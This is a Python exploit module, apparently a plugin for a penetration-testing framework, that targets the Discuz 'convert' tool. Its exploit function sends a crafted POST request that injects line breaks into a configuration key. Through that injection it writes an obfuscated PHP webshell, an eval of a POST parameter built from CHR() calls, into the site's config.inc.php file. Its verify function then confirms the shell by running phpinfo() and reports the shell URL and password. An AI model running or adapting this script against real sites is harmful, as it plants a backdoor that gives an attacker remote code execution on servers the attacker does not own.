#!/usr/bin/env python
#-*-coding:utf-8-*-

from modules.http import http
from modules.plugins import logger

author = "soeasyd@gmail.com"
title = 'convert getshell'
description = "Discuz convert工具，配置文件getshell"
reference = "http://cb.drops.wiki/drops/papers-929.html"
options = {
    'target':'http://www.xxoo.com/convert'
}

def verify(url):
    logger.process("Verify webshell...")

    url = url + '/data/config.inc.php'
    # 根据payload设置
    payload = 'c=phpinfo()'

    response = http.post(url, payload)

    if "phpinfo" in response.text:
        logger.success("Exploit success :)")
        return {'shell':url, 'passwd': 'c'}
    else:
        logger.error('Exploit fail :(')
        return False

def exploit(options):
    # 获取设置的参数
    url = options["target"]["current_value"]

    payload = 'a=config&source=d7.2_x2.0&submit=yes&newconfig[target][dbhost]=localhost&newconfig[Config%0d%0a%0d%0a'
    # eval($_POST[c])
    payload += 'eval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=localhost'
    payload += '&newconfig[source][dbuser]=root&newconfig[source][dbpw]=&newconfig[source][dbname]=discuz&newconfig[source][tablepre]=cdb_'
    payload += '&newconfig[source][dbcharset]=&newconfig[source][pconnect]=1&newconfig[target][dbhost]=localhost&newconfig[target][dbuser]=root&newconfig[target][dbpw]='
    payload += '&newconfig[target][dbname]=discuzx&newconfig[target][tablepre]=pre_&newconfig[target][dbcharset]=&newconfig[target][pconnect]=1&submit=yes'
    # 设置编码
    payload.encode('utf-8')
    response = http.post(url, payload)

    result = verify(url)
    if result:
        logger.success("Webshell: %s" % result['shell'])
        logger.success('Password: %s' % result['passwd'])
        return result
